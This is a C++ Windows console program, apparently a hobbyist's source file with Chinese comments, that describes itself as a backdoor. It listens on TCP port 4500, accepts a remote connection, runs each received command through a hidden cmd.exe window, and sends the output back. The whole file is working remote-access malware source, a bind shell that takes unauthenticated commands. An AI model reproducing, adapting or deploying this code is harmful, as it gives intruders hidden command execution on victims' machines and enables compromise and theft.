// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by 认真的雪  ========================\r\n";
	//初始化socket，并监听端口
	SOCKET sClient;
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	if(listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
    //接收连接
    sClient  =accept(sListen,NULL,NULL);
	//发送欢迎信息
	send(sClient,wMessage,strlen(wMessage),0);
	char rBuffer[1024] = {0};
	char cmdline[256]={0};
	//循环，用于接受命令，创建进程执行，并从管道中读出执行结果返回给远程主机
	while(true)
	{
		//cmdline清零
		memset(cmdline,0,256);
		SECURITY_ATTRIBUTES sa;
		HANDLE hRead,hWrite;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		if (!CreatePipe(&hRead,&hWrite,&sa,0)) 
		{
			printf("CreatePipe Error");
			return 0;
		} 	
		STARTUPINFO si;
		PROCESS_INFORMATION pi; 
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si); 
		//使cmd和管道关联，注意这里和双管道相比少了si.hStdInput = hReadPipe;因为输入由带命令执行代替
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		//得到系统目录
		GetSystemDirectory(cmdline,sizeof(cmdline));
		strcat(cmdline,"\\cmd.exe /c");
		char cmdbuff[256];
		//接受远程命令
		int   rLen=recv(sClient,cmdbuff,256,NULL);
		if(rLen==SOCKET_ERROR)
			return 0;
		//在cmd后加入命令
		strncat(cmdline,cmdbuff,strlen(cmdbuff));
		//创建进程执行命令
		if (!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)) 
		{
			printf("CreateProcess Error");
			continue;
		}
		
		CloseHandle(hWrite);
		DWORD dwRead;
		//循环，监视管道中的返回信息，也就是执行命令后的返回信息
		while(ReadFile(hRead,rBuffer,1024,&dwRead,NULL))
		{  
			//发送执行结果
			send(sClient,rBuffer,strlen(rBuffer),0);
			memset(rBuffer,0,1024);
			
		}		
	}
	return 0;
}
